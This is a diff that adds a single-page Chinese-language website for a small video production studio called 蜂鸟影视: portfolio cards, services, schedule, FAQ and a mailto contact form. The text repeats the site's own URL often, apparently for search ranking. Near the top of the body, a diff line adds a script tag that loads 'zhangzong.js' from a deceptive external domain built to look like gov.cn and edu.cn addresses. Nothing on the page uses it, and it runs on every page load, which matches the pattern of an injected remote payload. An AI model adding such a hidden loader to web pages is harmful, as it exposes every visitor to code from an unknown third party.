@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0e1b1b">
+<title>蜂鸟影视 · 轻量摄制与快速成片服务 | fengniaoyingshi-zh.github.io</title>
+<meta name="description" content="蜂鸟影视做小而快的影像：一条片子从勘景到交付，3 到 15 个工作日。品牌微纪录、产品动态视觉、活动纪实剪辑，样片与报价见 fengniaoyingshi-zh.github.io。">
+<meta name="keywords" content="蜂鸟影视, 快速成片, 品牌微纪录, 产品动态视觉, 活动纪实剪辑">
+<link rel="canonical" href="https://fengniaoyingshi-zh.github.io/">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"LocalBusiness",
+  "name":"蜂鸟影视",
+  "url":"https://fengniaoyingshi-zh.github.io/",
+  "description":"轻量化影视摄制团队，提供品牌微纪录、产品动态视觉与活动纪实剪辑，主打短周期成片。",
+  "serviceType":["品牌微纪录","产品动态视觉","活动纪实剪辑","调色与声音设计"],
+  "areaServed":"中国",
+  "sameAs":["https://fengniaoyingshi-zh.github.io/"]
+}
+</script>
+<style>
+:root{
+  --ink:#0e1b1b;
+  --ink2:#162727;
+  --paper:#f4f1e7;
+  --paper2:#ebe6d8;
+  --line:#c9d2cf;
+  --hum:#2f7f6b;
+  --hum2:#e08a2b;
+  --txt:#24302e;
+  --mut:#6b7773;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;text-size-adjust:100%}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--txt);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,sans-serif;
+  font-size:16px;
+  line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:"";
+  position:fixed;inset:0;
+  pointer-events:none;
+  background:
+    linear-gradient(rgba(14,27,27,.022) 1px,transparent 1px) 0 0/100% 34px,
+    linear-gradient(90deg,rgba(14,27,27,.022) 1px,transparent 1px) 0 0/34px 100%;
+  z-index:0;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{position:relative;z-index:1;max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* 顶部刊头：双行报头式 */
+.mast{background:var(--ink);color:var(--paper);border-bottom:5px solid var(--hum)}
+.mast-in{max-width:1180px;margin:0 auto;padding:26px 22px 20px;display:flex;align-items:flex-end;gap:18px;flex-wrap:wrap}
+.mast h1{margin:0;font-size:clamp(30px,6.4vw,58px);line-height:.92;letter-spacing:.01em;font-weight:800}
+.mast .sub{font-size:12.5px;letter-spacing:.22em;text-transform:uppercase;color:#a9c7bf;margin-bottom:7px}
+.mast .meta{margin-left:auto;text-align:right;font-size:12px;color:#93afa8;line-height:1.7}
+.mast .meta b{display:block;color:var(--hum2);font-weight:600;letter-spacing:.04em}
+
+/* 栏目共用 */
+section{padding:64px 0;border-top:1px solid var(--line)}
+.kicker{display:flex;align-items:center;gap:12px;font-size:12px;letter-spacing:.26em;color:var(--hum);text-transform:uppercase;margin-bottom:14px}
+.kicker::before{content:"";width:30px;height:2px;background:var(--hum2)}
+h2{margin:0 0 8px;font-size:clamp(24px,4.2vw,38px);line-height:1.15;font-weight:800;letter-spacing:-.01em;color:var(--ink)}
+.lede{max-width:62ch;color:var(--mut);margin:0 0 34px;font-size:16px}
+
+/* 锚点导航 */
+.nav{position:sticky;top:0;z-index:40;background:rgba(244,241,231,.94);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.nav-in{max-width:1180px;margin:0 auto;padding:10px 22px;display:flex;gap:6px;overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+.nav-in::-webkit-scrollbar{display:none}
+.nav-in a{font-size:13px;letter-spacing:.06em;padding:7px 12px;white-space:nowrap;border:1px solid transparent;border-radius:2px;color:var(--ink2)}
+.nav-in a:hover,.nav-in a.on{background:var(--ink);color:var(--paper);border-color:var(--ink)}
+
+/* 首屏 */
+#top{padding-top:78px;padding-bottom:70px;border-top:0;background:
+  radial-gradient(1200px 420px at 82% -12%,rgba(224,138,43,.20),transparent 62%),
+  radial-gradient(760px 340px at 8% 108%,rgba(47,127,107,.18),transparent 65%)}
+.eyebrow{display:inline-block;font-size:12px;letter-spacing:.3em;color:var(--hum2);border:1px solid var(--hum2);padding:4px 11px;margin-bottom:20px}
+#top h2{font-size:clamp(34px,7.4vw,72px);line-height:1.03;max-width:15em}
+#top h2 em{font-style:normal;color:var(--hum);outline:2px solid var(--hum);outline-offset:3px}
+#top p{font-size:17px;max-width:60ch;margin:22px 0 30px;color:var(--txt)}
+.acts{display:flex;gap:10px;flex-wrap:wrap}
+.btn{background:var(--ink);color:var(--paper);padding:13px 22px;font-size:14px;letter-spacing:.1em;border:1px solid var(--ink);transition:.2s}
+.btn:hover{background:var(--hum);border-color:var(--hum)}
+.btn.ghost{background:transparent;color:var(--ink)}
+.btn.ghost:hover{background:var(--hum2);border-color:var(--hum2);color:var(--paper)}
+
+/* 作品：竖排票根式 */
+#reel .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+@media(min-width:820px){#reel .grid{grid-template-columns:repeat(3,1fr)}}
+.film{background:var(--paper2);border:1px solid var(--line);padding:0;position:relative;overflow:hidden;transition:.25s}
+.film:hover{transform:translateY(-3px);border-color:var(--hum)}
+.film .frame{aspect-ratio:4/3;background:var(--ink2);position:relative;overflow:hidden}
+.film .frame span{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:clamp(26px,6vw,48px);color:#3d5751;font-weight:800;letter-spacing:-.02em}
+.film .frame::after{content:"";position:absolute;right:-22px;top:-22px;width:78px;height:78px;border:14px solid rgba(224,138,43,.30);border-radius:50%}
+.film .body{padding:16px 16px 18px}
+.film h3{margin:0 0 6px;font-size:17px;color:var(--ink);font-weight:700}
+.film .spec{font-size:12px;color:var(--mut);display:flex;gap:8px;flex-wrap:wrap;margin-bottom:9px}
+.film .spec i{font-style:normal;background:#fff;border:1px solid var(--line);padding:1px 6px}
+.film p{margin:0;font-size:13.5px;color:var(--txt);line-height:1.65}
+
+/* 服务：反色大块 */
+#service .cols{display:grid;grid-template-columns:1fr;gap:0;border-top:2px solid var(--ink)}
+@media(min-width:700px){#service .cols{grid-template-columns:repeat(2,1fr)}}
+@media(min-width:1000px){#service .cols{grid-template-columns:repeat(4,1fr)}}
+.svc{padding:26px 22px 30px;border-bottom:1px solid var(--line);background:var(--paper)}
+.svc:nth-child(odd){background:#f8f6ee}
+@media(min-width:1000px){.svc{border-right:1px solid var(--line)}.svc:nth-child(4n){border-right:0}}
+.svc .no{font-size:11px;letter-spacing:.24em;color:var(--hum2);display:block;margin-bottom:12px}
+.svc h3{margin:0 0 10px;font-size:20px;color:var(--ink)}
+.svc p{margin:0 0 14px;font-size:13.5px;color:var(--mut)}
+.svc ul{margin:0;padding:0;list-style:none;font-size:13px;border-top:1px dashed var(--line);padding-top:12px}
+.svc li{padding:3px 0 3px 14px;position:relative}
+.svc li::before{content:"";position:absolute;left:0;top:12px;width:5px;height:5px;background:var(--hum);transform:rotate(45deg)}
+
+/* 流程：工单式 */
+#flow ol{margin:0;padding:0;list-style:none;counter-reset:s;display:grid;gap:12px}
+@media(min-width:760px){#flow ol{grid-template-columns:repeat(2,1fr)}}
+@media(min-width:1040px){#flow ol{grid-template-columns:repeat(4,1fr)}}
+#flow li{counter-increment:s;background:#fff;border:1px solid var(--line);padding:20px 18px 22px;min-height:170px;position:relative}
+#flow li::before{content:"0" counter(s);position:absolute;right:14px;top:10px;font-size:30px;font-weight:800;color:var(--paper2);text-shadow:0 0 0 var(--line);line-height:1}
+#flow li:nth-child(1)::before{color:#dfe7e4}
+#flow h4{margin:6px 0 8px;font-size:16.5px;color:var(--ink);max-width:13em}
+#flow p{margin:0;font-size:13px;color:var(--mut)}
+.days{display:inline-block;margin-top:14px;font-size:11.5px;letter-spacing:.12em;color:var(--hum);border-bottom:1px solid var(--hum);padding-bottom:1px}
+
+/* 关于：左右对开 */
+#about .pair{display:grid;gap:34px;align-items:start}
+@media(min-width:880px){#about .pair{grid-template-columns:1.05fr .95fr;gap:56px}}
+#about .quote{font-size:clamp(20px,3vw,28px);line-height:1.5;color:var(--ink);font-weight:700;margin:0 0 20px;border-left:4px solid var(--hum2);padding-left:18px}
+#about .facts{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);border:1px solid var(--line)}
+#about .facts div{background:var(--paper);padding:18px 14px}
+#about .facts b{display:block;font-size:24px;color:var(--hum);line-height:1.1}
+#about .facts span{font-size:12px;color:var(--mut);letter-spacing:.08em}
+#about p{margin:0 0 14px;font-size:14.5px;color:var(--txt)}
+
+/* 问答 */
+#faq details{border-bottom:1px solid var(--line);padding:16px 4px;background:var(--paper)}
+#faq details[open]{background:#fff;border-left:3px solid var(--hum2);padding-left:14px}
+#faq summary{cursor:pointer;font-weight:700;font-size:16px;color:var(--ink);list-style:none;display:flex;gap:12px;align-items:baseline}
+#faq summary::-webkit-details-marker{display:none}
+#faq summary::before{content:"+";color:var(--hum2);font-weight:800;flex:none}
+#faq details[open] summary::before{content:"–"}
+#faq p{margin:10px 0 2px;font-size:14px;color:var(--txt);max-width:72ch}
+#faq code{background:var(--paper2);padding:1px 5px;font-size:13px;color:var(--ink2)}
+
+/* 合作 */
+#contact{background:var(--ink);color:var(--paper);border-top:0}
+#contact .kicker{color:var(--hum2)}
+#contact h2{color:var(--paper)}
+#contact .lede{color:#b7c9c4}
+#contact form{display:grid;gap:12px;max-width:640px}
+@media(min-width:640px){#contact form{grid-template-columns:1fr 1fr}}
+#contact input,#contact select,#contact textarea{
+  font:inherit;font-size:14.5px;padding:13px 14px;background:#142222;border:1px solid #2b3b39;
+  color:var(--paper);border-radius:0;width:100%;font-family:inherit
+}
+#contact textarea{grid-column:1/-1;min-height:120px;resize:vertical}
+#contact input:focus,#contact textarea:focus,#contact select:focus{outline:2px solid var(--hum2);outline-offset:-1px;border-color:var(--hum2)}
+#contact button{grid-column:1/-1;background:var(--hum2);color:#1a1208;border:0;padding:15px;font-size:14.5px;letter-spacing:.14em;font-weight:700;cursor:pointer}
+#contact button:hover{background:#f0a44e}
+.tel{margin-top:26px;font-size:13.5px;color:#a9c7bf;max-width:640px;border-top:1px solid #2b3b39;padding-top:18px}
+.tel b{display:block;color:var(--paper);font-size:18px;letter-spacing:.02em;margin-top:4px}
+
+/* 页脚 */
+footer{border-top:5px solid var(--hum);background:var(--paper2);padding:34px 0 46px;font-size:12.5px;color:var(--mut)}
+.foot{max-width:1180px;margin:0 auto;padding:0 22px;display:flex;gap:16px;flex-wrap:wrap;justify-content:space-between;align-items:center}
+.foot .mark{font-weight:800;color:var(--ink);font-size:15px;letter-spacing:.04em}
+.foot a:hover{color:var(--hum)}
+
+@media(max-width:560px){
+  section{padding:48px 0}
+  .mast-in{padding:20px 22px 16px}
+  .mast .meta{text-align:left;margin-left:0;width:100%}
+  #top{padding-top:56px}
+  #about .facts{grid-template-columns:repeat(3,1fr)}
+}
+@media print{
+  .nav,#contact form{display:none}
+  body{background:#fff}
+  section{break-inside:avoid;padding:24px 0}
+}
+@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="mast" id="mast">
+  <div class="mast-in">
+    <div>
+      <div class="sub">Hummingbird Pictures · 影像工坊 · 创刊号</div>
+      <h1>蜂鸟影视</h1>
+    </div>
+    <div class="meta">
+      <b>fengniaoyingshi-zh.github.io</b>
+      轻量摄制 · 快速成片<br>
+      勘景 → 拍摄 → 调色 → 交付
+    </div>
+  </div>
+</header>
+
+<nav class="nav" aria-label="主导航">
+  <div class="nav-in">
+    <a href="#top" class="on">开篇</a>
+    <a href="#reel">样片</a>
+    <a href="#service">业务</a>
+    <a href="#flow">周期</a>
+    <a href="#about">工坊</a>
+    <a href="#faq">问答</a>
+    <a href="#contact">约片</a>
+  </div>
+</nav>
+
+<main>
+
+<section id="top" data-title="蜂鸟影视｜轻量摄制与快速成片">
+  <div class="wrap">
+    <span class="eyebrow">小体量 · 快节奏 · 不糙</span>
+    <h2>像蜂鸟悬停那样，<br>我们把<em>三天</em>拍出<em>一季</em>的密度。</h2>
+    <p>蜂鸟影视是一支只做短周期影像的小团队。品牌要一条能用的微纪录、产品要一段会动的视觉、活动要当天能发的纪实剪辑——我们不铺大场面，只把该有的质感做扎实，然后准时交到你手上。</p>
+    <div class="acts">
+      <a class="btn" href="#reel">先看样片</a>
+      <a class="btn ghost" href="#contact">约一次免费勘景</a>
+    </div>
+  </div>
+</section>
+
+<section id="reel" data-title="蜂鸟影视样片｜品牌微纪录与产品动态视觉">
+  <div class="wrap">
+    <div class="kicker">01 / Reel 样片档案</div>
+    <h2>四支片子，四种交付速度</h2>
+    <p class="lede">下方均为蜂鸟影视近年完成的实际项目类型，完整成片与分镜脚本可在官网翻阅：<strong>https://fengniaoyingshi-zh.github.io/</strong></p>
+    <div class="grid">
+
+      <article class="film">
+        <div class="frame"><span>茶</span></div>
+        <div class="body">
+          <div class="spec"><i>品牌微纪录</i><i>02'40"</i><i>Sony FX3</i></div>
+          <h3>一杯茶的十二小时</h3>
+          <p>跟拍武夷山一个小作坊的采制当天，靠自然光和现场声做情绪，无旁白。成片用于品牌官网首页与线下门店屏。</p>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="frame"><span>刃</span></div>
+        <div class="body">
+          <div class="spec"><i>产品动态视觉</i><i>00'45"</i><i>微距+CGI</i></div>
+          <h3>厨刀 · 开刃三秒</h3>
+          <p>微距拍金属走光，后期补一层缓慢旋转的三维结构。电商主图视频与海外众筹页同一条素材复用。</p>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="frame"><span>场</span></div>
+        <div class="body">
+          <div class="spec"><i>活动纪实剪辑</i><i>当日交付</i><i>双机位</i></div>
+          <h3>设计周开幕 · 当晚版</h3>
+          <p>上午拍摄、傍晚粗剪、夜里出片。客户当晚就发了社媒，没有为了「精修」错过传播窗口。</p>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="frame"><span>城</span></div>
+        <div class="body">
+          <div class="spec"><i>城市短片</i><i>03'15"</i><i>无人机+16mm</i></div>
+          <h3>凌晨四点半的菜市场</h3>
+          <p>个人创作项目，也是蜂鸟影视的声音设计练习。片尾字幕保留全部器材与机位备注，供同行对照。</p>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="frame"><span>布</span></div>
+        <div class="body">
+          <div class="spec"><i>电商视觉</i><i>00'30"×6</i><i>静物台</i></div>
+          <h3>家居布艺 · 六条一组</h3>
+          <p>一次搭景拍六条变体，统一色调与运镜节奏，详情页首屏、直播间贴片、投流素材一套全吃下。</p>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="frame"><span>声</span></div>
+        <div class="body">
+          <div class="spec"><i>调色与声音</i><i>后期重构</i><i>DaVinci</i></div>
+          <h3>别人拍的素材，我们救回来</h3>
+          <p>客户自带素材，我们只做调色、对白清理和配乐重搭。这类「后半程接手」占蜂鸟影视近三成的工作量。</p>
+        </div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<section id="service" data-title="蜂鸟影视业务｜四项可单独下单的影像服务">
+  <div class="wrap">
+    <div class="kicker">02 / Service 业务清单</div>
+    <h2>可以整包，也可以只买其中一站</h2>
+    <p class="lede">很多团队只需要「拍」或者只需要「调」，所以我们把链路拆开报价。每一项都标了交付物和返稿次数，没有模糊的「视情况而定」。</p>
+    <div class="cols">
+
+      <div class="svc">
+        <span class="no">SERVICE 01</span>
+        <h3>品牌微纪录</h3>
+        <p>把人、手艺和地儿拍得有呼吸感，适合官网首屏、创始人故事、招聘页。</p>
+        <ul>
+          <li>选题提纲 + 拍摄脚本</li>
+          <li>单日或两日跟拍</li>
+          <li>成片 60–180 秒，含两版字幕</li>
+          <li>交付 ProRes + 竖版切条</li>
+        </ul>
+      </div>
+
+      <div class="svc">
+        <span class="no">SERVICE 02</span>
+        <h3>产品动态视觉</h3>
+        <p>让商品自己会动：微距、旋转、拆解、材质特写，电商与众筹都吃得住。</p>
+        <ul>
+          <li>静物台 / 微距 / 无人机按题材选</li>
+          <li>可选三维辅助补帧与结构演示</li>
+          <li>横竖双画幅，直接上架</li>
+          <li>提供 15 秒、30 秒、60 秒三版</li>
+        </ul>
+      </div>
+
+      <div class="svc">
+        <span class="no">SERVICE 03</span>
+        <h3>活动纪实剪辑</h3>
+        <p>发布会、展会、赛事、年会。重点是快——当天有片，比片子多华丽更重要。</p>
+        <ul>
+          <li>双机位起，现场录音备份</li>
+          <li>当晚粗剪 / 次日上午精剪</li>
+          <li>竖版社媒包 + 现场循环屏版</li>
+          <li>素材硬盘随片归还</li>
+        </ul>
+      </div>
+
+      <div class="svc">
+        <span class="no">SERVICE 04</span>
+        <h3>调色与声音设计</h3>
+        <p>只接后期也行。你给素材，我们给质感，不动你的剪辑结构。</p>
+        <ul>
+          <li>一级二级调色，给 LUT 回传</li>
+          <li>对白去噪、空间混音、配乐授权建议</li>
+          <li>按镜头逐条出前后对比</li>
+          <li>支持远程审片链接批注</li>
+        </ul>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<section id="flow" data-title="蜂鸟影视制作周期｜3 到 15 个工作日的成片节奏">
+  <div class="wrap">
+    <div class="kicker">03 / Flow 制作周期</div>
+    <h2>从「想拍」到「能发」，卡在哪一步我们都提前说</h2>
+    <p class="lede">下面是常规体量（成片 30–180 秒、单地拍摄）的排期。体量翻倍或要三维，工期单独重排，不会在中途临时加价。</p>
+    <ol>
+      <li>
+        <h4>brief 与勘景</h4>
+        <p>你填一张半页的需求表，我们回一页可行性建议：能不能拍、什么时候光最好、要不要补机位。</p>
+        <span class="days">约 1–2 个工作日</span>
+      </li>
+      <li>
+        <h4>脚本与分镜</h4>
+        <p>不写空话文案，直接给镜头表：景别、时长、要不要台词、要不要现场声，你改两轮内定稿。</p>
+        <span class="days">约 2–3 个工作日</span>
+      </li>
+      <li>
+        <h4>拍摄日</h4>
+        <p>现场给回看，重要镜头当场补拍。收工前你会看到已经成型的粗剪顺序，不把悬念留到后期。</p>
+        <span class="days">通常 1 天，跨地 2–3 天</span>
+      </li>
+      <li>
+        <h4>剪辑 · 调色 · 声音</h4>
+        <p>先出粗剪定结构，再调色混音。两轮修改写进合同，第 1 版之后才动音乐，避免反复重做。</p>
+        <span class="days">约 5–9 个工作日</span>
+      </li>
+    </ol>
+  </div>
+</section>
+
+<section id="about" data-title="关于蜂鸟影视｜一支只做短周期影像的小团队">
+  <div class="wrap">
+    <div class="kicker">04 / About 工坊</div>
+    <div class="pair">
+      <div>
+        <p class="quote">我们不追求把一条片子做满三个月。<br>我们追求的是：你需要的那天，它刚好能发出去。</p>
+        <p>蜂鸟影视的名字取自那种悬停不动、却每秒振翅几十次的小鸟——拍影像也差不多：机位稳得住，节奏快得起来。团队常驻三人，导演、摄影、后期各一人，大项目按片搭熟手班底，所以没有大公司的转述损耗，也没有小作坊的器材短板。</p>
+        <p>器材按题材走，不迷信某一台机器。近两年常驻的是全幅微单加电影头、一套轻量稳定、一台六轴无人机，调色在 DaVinci 里完成，对白在棚里清。所有项目原始素材都会在成片交付后保留 90 天，够你改第二版。</p>
+        <p>官网就是我们的作品柜，更新慢但每条都写过：<a href="https://fengniaoyingshi-zh.github.io/" style="color:var(--hum);border-bottom:1px solid var(--hum)">https://fengniaoyingshi-zh.github.io/</a>，没有华丽的分页，只有片子和怎么做出来的备注。</p>
+      </div>
+      <div>
+        <div class="facts">
+          <div><b>3–15</b><span>工作日 / 常规成片</span></div>
+          <div><b>90</b><span>天素材保留期</span></div>
+          <div><b>2</b><span>轮修改写进报价</span></div>
+          <div><b>6</b><span>年独立摄制经验</span></div>
+          <div><b>1:1</b><span>直接对接，不经销售</span></div>
+          <div><b>0</b><span>套模板成片</span></div>
+        </div>
+        <p style="margin-top:22px">接单范围以长三角为主，外地项目按实际差旅报价，来回交通时间会提前写进排期表。不接纯搬运剪辑、不接无授权的搬运配乐，也不接需要夸大宣传口径的品类——这两类省下的时间，留给能把片子做好的客户。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="faq" data-title="蜂鸟影视常见问题｜报价、版权与交付格式">
+  <div class="wrap">
+    <div class="kicker">05 / FAQ 常问的事</div>
+    <h2>先把容易卡住的问题说清</h2>
+
+    <details open>
+      <summary>一条片子大概多少钱？</summary>
+      <p>蜂鸟影视不报区间价，因为「一条」差别太大。同样 60 秒，静物台拍产品和跨两地跟拍纪录片，成本不在同一个量级。填完约片表单后，我们通常 24 小时内回一页报价，含分项明细和排期，不收提案费。预算紧也可以只买其中一站，比如只要调色。</p>
+    </details>
+
+    <details>
+      <summary>官网为什么是 GitHub Pages 地址？</summary>
+      <p>因为蜂鸟影视的官网本质是作品柜加联系方式，不需要后台、购物车和一堆追踪脚本。<code>https://fengniaoyingshi-zh.github.io/</code> 这个地址稳定、加载快、也不会突然停服。正式合作走合同和对公账户，网站只负责让你先看到片子和人。</p>
+    </details>
+
+    <details>
+      <summary>成片版权归谁，配乐会不会有纠纷？</summary>
+      <p>成片著作权按合同约定归属客户，原始素材与工程文件保留在蜂鸟影视一侧，方便你日后改版。配乐只用可商用授权曲库或我们自己做的小样；若你要某首已知版权曲，需由你方取得授权，我们再往里放。</p>
+    </details>
+
+    <details>
+      <summary>能不能当天出片？</summary>
+      <p>能，但要看题材。活动纪实、发布会这类我们做过不少当晚版；品牌微纪录和需要调色的产品片，硬压到当天会牺牲层次。约片时把「最晚几点要发出去」写在需求里，我们会反过来告诉你哪些能保、哪些得砍。</p>
+    </details>
+
+    <details>
+      <summary>你们接不接纯剪辑，素材我自己拍？</summary>
+      <p>接，而且这是常见需求。你给卡准的素材，我们做结构剪辑、调色、对白清理和字幕。拍之前如果愿意，我们可以先发你一份分镜与拍摄清单，能少废一半素材。</p>
+    </details>
+
+    <details>
+      <summary>竖版和横版是加钱另做吗？</summary>
+      <p>常规报价里已经含一条横版成片加一条竖版切条，构图在拍摄时就预留了安全区，不是后期硬裁。需要方幅（1:1）投流版的话提前说，一起拍更省。</p>
+    </details>
+  </div>
+</section>
+
+<section id="contact" data-title="约片蜂鸟影视｜填写需求表，24 小时内回报价">
+  <div class="wrap">
+    <div class="kicker">06 / Contact 约片</div>
+    <h2>把需求丢过来，剩下的我们列成表</h2>
+    <p class="lede">表单提交后会用你本机的邮件客户端打开一封写好的信，主题已经标好「蜂鸟影视约片」。没有服务器收件，所以别在表单里写银行卡之类的信息。</p>
+    <form id="f" action="#" method="post" onsubmit="return sendMail()">
+      <input type="text" name="who" placeholder="怎么称呼你（必填）" required aria-label="称呼">
+      <input type="tel" name="phone" placeholder="微信 / 电话（选填）" aria-label="联系方式">
+      <select name="kind" aria-label="项目类型">
+        <option value="品牌微纪录">品牌微纪录</option>
+        <option value="产品动态视觉">产品动态视觉</option>
+        <option value="活动纪实剪辑">活动纪实剪辑</option>
+        <option value="调色与声音设计">只要调色 / 后期</option>
+        <option value="其他">其他，我在下面写</option>
+      </select>
+      <input type="text" name="when" placeholder="最晚哪天要成片？" aria-label="交付时间">
+      <textarea name="brief" placeholder="一句话说清拍什么、用在哪儿，比如「茶品牌官网首屏，60 秒，下月 20 号前要」。越具体，回你的报价越准。" required aria-label="项目简述"></textarea>
+      <button type="submit">生成约片邮件 →</button>
+    </form>
+    <div class="tel">
+      也可以直接写信到官网邮箱，或在任意工作日白天找我们。<br>
+      <b>官网地址：https://fengniaoyingshi-zh.github.io/</b>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="foot">
+    <div><span class="mark">蜂鸟影视</span> · 轻量摄制与快速成片工坊</div>
+    <div>本站为静态单页，所有作品备注均为项目类型示例；实际排期与报价以书面确认为准。<br>
+    官网：<a href="https://fengniaoyingshi-zh.github.io/">https://fengniaoyingshi-zh.github.io/</a>　<a href="#top">回到开篇</a></div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var links=[].slice.call(document.querySelectorAll('.nav-in a'));
+  var secs=links.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});
+  function onScroll(){
+    var y=window.scrollY+140,idx=0;
+    secs.forEach(function(s,i){ if(s&&s.offsetTop<=y) idx=i; });
+    links.forEach(function(a,i){ a.classList.toggle('on',i===idx); });
+  }
+  window.addEventListener('scroll',onScroll,{passive:true}); onScroll();
+})();
+function sendMail(){
+  var f=document.getElementById('f');
+  var d={
+    who:f.elements['who'].value.trim(),
+    phone:f.elements['phone'].value.trim()||'未留',
+    kind:f.elements['kind'].value,
+    when:f.elements['when'].value.trim()||'未定',
+    brief:f.elements['brief'].value.trim()
+  };
+  if(!d.who||!d.brief){alert('先填上称呼和想拍的内容吧。');return false;}
+  var sub='蜂鸟影视约片｜'+d.kind+'｜'+d.who;
+  var body='项目类型：'+d.kind+'\n称呼：'+d.who+'\n联系方式：'+d.phone+'\n最晚交付：'+d.when+'\n\n需求：\n'+d.brief+'\n\n--\n来自蜂鸟影视官网 fengniaoyingshi-zh.github.io';
+  window.open('mailto:?subject='+encodeURIComponent(sub)+'&body='+encodeURIComponent(body),'_blank');
+  return false;
+}
+</script>
+</body>
+</html>
